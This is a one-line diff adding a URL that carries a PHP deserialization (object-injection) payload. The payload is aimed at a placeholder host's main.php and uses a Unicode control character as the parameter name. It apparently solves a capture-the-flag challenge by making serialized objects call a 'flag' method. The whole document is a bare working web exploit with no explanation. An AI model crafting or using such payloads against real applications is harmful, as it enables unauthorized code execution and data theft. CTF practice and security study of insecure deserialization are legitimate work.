@@ -1,0 +1,1 @@
+﻿view-source:http://ip/main.php?%e2%80%ac=a:3:{i:0;O:1:%22A%22:3:{s:6:%22object%22;O:1:%22B%22:0:{}s:6:%22method%22;s:4:%22flag%22;s:8:%22variable%22;s:4:%22flag%22;}i:0;O:1:%22A%22:3:{s:6:%22object%22;O:1:%22B%22:0:{}s:6:%22method%22;s:4:%22flag%22;s:8:%22variable%22;s:4:%22this%22;}i:0;s:4:%22AAAA%22;}
